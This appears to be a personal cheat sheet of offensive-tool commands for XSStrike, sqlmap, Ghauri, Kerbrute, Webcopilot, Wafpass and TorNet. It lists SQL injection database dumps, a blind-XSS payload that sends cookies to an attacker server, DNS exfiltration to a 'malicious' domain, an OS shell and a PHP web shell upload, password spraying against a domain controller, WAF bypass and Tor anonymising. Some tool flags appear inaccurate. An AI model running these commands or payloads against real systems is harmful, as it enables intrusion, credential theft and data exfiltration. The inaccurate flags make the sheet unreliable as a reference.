# Tools-Notes
************************--Notes--************************


--SQLMC--
Normal user 
Basic Command: sqlmc -u http://example.com -d 2 -o Output_file

--------------------------------------------------------------------------------------------------------------



--Xsstrike--

Basic Command:  python3 xsstrike.py -u http://example.com 

Scanning a List of URLs: python3 xsstrike.py --file urls.txt

Crawl Mode: python3 xsstrike.py --crawl -u http://example.com/

Use a Proxy: python3 xsstrike.py -u "http://example.com/" --proxy http://127.0.0.1:8080

Use a Custom User-Agent: python3 xsstrike.py -u "http://example.com/" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

Specify Cookies: python3 xsstrike.py -u "http://example.com/" --cookie "sessionid=abc123; user=admin"

Specify HTTP Headers: python3 xsstrike.py -u "http://example.com/" --headers "Authorization: Bearer token123"

Use Fuzzing Mode: python3 xsstrike.py -u "http://example.com/search.php?q=test" --fuzzer

Blind XSS: python3 xsstrike.py -u "http://example.com/search.php?q=test" --payload "<script>new Image().src='http://yourserver.com/callback?c='+document.cookie;</script>"

--------------------------------------------------------------------------------------------------------------


--Sqlmap--

Basic Commands: sqlmap -u http://example.com/page.php?id=1

Request Method (GET/POST): sqlmap -u "http://example.com/page.php?id=1" --method=POST --data="username=admin&password=admin"

Specify HTTP Headers (User-Agent, Referer, Cookie, etc.): sqlmap -u "http://example.com/page.php?id=1" --headers="User-Agent: Mozilla/5.0, Referer: http://google.com"
                                                                                                          OR
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=123456789"

Database Enumeration: sqlmap -u "http://example.com/page.php?id=1" –dbs

Enumerate Tables: sqlmap -u "http://example.com/page.php?id=1" -D targetdb –tables

Dump a Table’s Data: sqlmap -u "http://example.com/page.php?id=1" -D targetdb -T users –dump

Specify SQL Injection Techniques: sqlmap -u "http://example.com/page.php?id=1" --technique=BEUST
•	B: Boolean-based Blind
•	E: Error-based
•	U: UNION query-based
•	S: Stacked queries
•	T: Time-based Blind

Tamper Scripts to Bypass WAF/Filters: sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment
•	You can list all tamper scripts with: sqlmap --list-tampers

Crawling Websites: sqlmap -u "http://example.com/" --crawl=5 --level=3

Bypassing WAF with Random User-Agent: sqlmap -u "http://example.com/page.php?id=1" --random-agent

Scanning with a Proxy: sqlmap -u "http://example.com/page.php?id=1" --proxy=http://127.0.0.1:8080

SQL Injection with Time Delays: sqlmap -u "http://example.com/page.php?id=1" --time-sec=10

Using a Custom Payload: sqlmap -u "http://example.com/page.php?id=1" --payload="1' OR '1'='1"

Specifying Risk and Level: sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3
•	--level: Specifies the level of tests. It ranges from 1 to 5 (higher levels perform more tests).
•	--risk: Specifies the risk level, ranging from 1 to 3 (higher risks include potentially destructive actions).

Brute-Forcing the Passwords: sqlmap -u "http://example.com/page.php?id=1" –passwords

Direct SQL Shell on the Target: sqlmap -u "http://example.com/page.php?id=1" --os-shell

Dump Specific Columns from a Table: sqlmap -u "http://example.com/page.php?id=1" -D targetdb -T users -C username,password –dump

Enumerate Users, Privileges, Roles: sqlmap -u "http://example.com/page.php?id=1" –users
•	--users: Lists all database users.
•	--privileges: Retrieves privileges for the database users.
•	--roles: Enumerates roles assigned to the users.

Session Management: sqlmap -u "http://example.com/page.php?id=1" --flush-session

Performing a Blind SQL Injection Test: sqlmap -u "http://example.com/page.php?id=1" --technique=B --level=3 --risk=3

Advanced Enumeration Options: sqlmap -u "http://example.com/page.php?id=1" --columns -D targetdb -T users

DNS-Based Data Exfiltration: sqlmap -u "http://example.com/page.php?id=1" --dns-domain="yourmaliciousdomain.com"

Advanced File Writing/Reading: sqlmap -u "http://example.com/page.php?id=1" --file-write="/path/to/yourfile" --file-dest="/var/www/html/shell.php"

Output to a File: sqlmap -u "http://example.com/page.php?id=1" --batch --output-dir="/your/output/directory/"

--------------------------------------------------------------------------------------------------------------


--Ghauri--

Basic Usage: python3 ghauri.py -u http://example.com/page.php?id=1

Using POST Request: python3 ghauri.py -u "http://example.com/page.php" --data="id=1"
•	--data="id=1" specifies the POST data, indicating that this is a POST request.

Setting Custom User-Agent:  python3 ghauri.py -u "http://example.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

Specifying Cookies: python3 ghauri.py -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abcdef123456"

Listing Databases: python3 ghauri.py -u "http://example.com/page.php?id=1" –dbs

Specify an HTTP Method:  python3 ghauri.py -u "http://example.com/page.php?id=1" --method=POST --data="username=admin&password=admin"

Request Timeout:  python3 ghauri.py -u "http://example.com/page.php?id=1" --timeout=30

Blind SQL Injection Detection:  python3 ghauri.py -u "http://example.com/page.php?id=1" --technique=B

Setting Delays for Time-Based SQL Injection: python3 ghauri.py -u "http://example.com/page.php?id=1" --delay=5

Custom HTTP Headers: python3 ghauri.py -u "http://example.com/page.php?id=1" --headers="Authorization: Bearer abc123" 

Injecting into Multiple Parameters: python3 ghauri.py -u http://example.com/page.php?id=1&cat=2

Output to a File: python3 ghauri.py -u "http://example.com/page.php?id=1" --output-file=results.txt

Specify Technique:  python3 ghauri.py -u "http://example.com/page.php?id=1" --technique=BT
•	B: Boolean-based Blind
•	T: Time-based Blind
Setting the Number of Retries:  python3 ghauri.py -u "http://example.com/page.php?id=1" --retries=3

Using Proxy: python3 ghauri.py -u "http://example.com/page.php?id=1" --proxy=http://127.0.0.1:8080

Increasing Verbosity for Debugging: python3 ghauri.py -u "http://example.com/page.php?id=1" –verbose

Tampering or Bypassing Filters:  python3 ghauri.py -u "http://example.com/page.php?id=1" --tamper="space2comment"

Using DNS-Based Data Exfiltration:  python3 ghauri.py -u "http://example.com/page.php?id=1" --dns-domain="yourmaliciousdomain.com"

Commonly Used Combined Commands: python3 ghauri.py -u "http://example.com/page.php" --data="id=1" --user-agent="Mozilla/5.0" --proxy=http://127.0.0.1:8080

Full Scan Using Blind and Time-Based Techniques: python3 ghauri.py -u "http://example.com/page.php?id=1" --technique=BT --verbose --timeout=10

Exfiltrating Data from a Specific Table: python3 ghauri.py -u "http://example.com/page.php?id=1" --technique=B --dbs --dump --table=users

--------------------------------------------------------------------------------------------------------------
 



--Kerbrute--

Check Valid Usernames: ./kerbrute_linux_amd64 userenum -d example.com --dc 192.168.1.10 usernames.txt

Password Spray Attack: ./kerbrute_linux_amd64 passwordspray -d example.com --dc 192.168.1.10 usernames.txt -p Password123

Brute Force: ./kerbrute_linux_amd64 bruteforce -d example.com --dc 192.168.1.10 usernames.txt passwords.txt

Verbose User Enumeration: ./kerbrute_linux_amd64 userenum -d example.com --dc 192.168.1.10 usernames.txt -v

User Enumeration with Multi-Threading: ./kerbrute_linux_amd64 userenum -d example.com --dc 192.168.1.10 usernames.txt --threads 100 

Password Spray with Multiple Passwords: ./kerbrute_linux_amd64 passwordspray -d example.com --dc 192.168.1.10 usernames.txt -P passwords.txt -v

Output to File: ./kerbrute_linux_amd64 userenum -d example.com --dc 192.168.1.10  usernames.txt --output valid_users.txt

User Enumeration with Custom Timeout: ./kerbrute_linux_amd64 userenum -d example.com   --dc 192.168.1.10  usernames.txt --timeout 5s

Brute Force with Debug Mode: ./kerbrute_linux_amd64 bruteforce -d example.com  --dc 192.168.1.10  usernames.txt passwords.txt –debug

--------------------------------------------------------------------------------------------------------------





--Webcopilot--


Specify a Target: webcopilot -u http://example.com

Crawl Website: webcopilot -u "http://example.com" --crawl

Port Scanning: webcopilot -u "http://example.com" –ports

SQL Injection Scan: webcopilot -u "http://example.com" --sqlscan

Cross-Site Scripting (XSS) Scan: webcopilot -u "http://example.com" --xss

Directory Brute-forcing: webcopilot -u "http://example.com" --dirbrute 

Login Brute-Force: webcopilot -u "http://example.com/login" --login --users users.txt --passwords passwords.txt

Bypassing Filters: webcopilot -u "http://example.com" --bypass

Custom User-Agent: webcopilot -u "http://example.com" --user-agent "Mozilla/5.0"

Use a Proxy: webcopilot -u "http://example.com" --proxy http://127.0.0.1:8080

Save Output to a File: webcopilot -u "http://example.com" --output report.txt


--------------------------------------------------------------------------------------------------------------



--Wafpass.--

Specify a Target URL: wafpass -u http://example.com

Basic Payload Testing: wafpass -u "http://example.com" --payload "1' OR '1'='1"

Using Encoding Techniques: wafpass -u "http://example.com" --encode base64

Using Different Tamper Scripts: wafpass -u "http://example.com" --tamper space2comment
            List of Possible Tamper Scripts:
•	space2comment: Replaces spaces with SQL comments.
•	charencode: Encodes characters in hexadecimal.
•	base64encode: Encodes payloads in Base64.
•	between: Inserts SQL comments between SQL keywords.


Testing Multiple WAF Bypass Techniques: wafpass -u "http://example.com" --techniques BT
•	B: Boolean-based techniques.
•	T: Time-based techniques.

Custom Headers for Obfuscation: wafpass -u "http://example.com" --headers "X-Forwarded-For: 127.0.0.1"

Using Different HTTP Methods: wafpass -u "http://example.com" --method POST --data "username=admin&password=admin"

Testing with Custom Payloads: wafpass -u "http://example.com" --payload "<custom payload>"

Testing Using a Proxy: wafpass -u "http://example.com" --proxy http://127.0.0.1:8080

Delay Between Requests: wafpass -u "http://example.com" --delay 3

Verbose Mode for Debugging: wafpass -u "http://example.com" -v

Combining Tamper Scripts and Encoding: wafpass -u "http://example.com" --payload "1' OR '1'='1" --tamper space2comment,between --encode base64

Using Proxy and Custom Headers: wafpass -u "http://example.com" --proxy "http://127.0.0.1:8080" --headers "User-Agent: Mozilla/5.0"

Testing with Delay and Verbose Output: wafpass -u "http://example.com" --delay 5 -v


--------------------------------------------------------------------------------------------------------------



--TorNet--

sudo tornet --interval 5  --count 0 

--------------------------------------------------------------------------------------------------------------


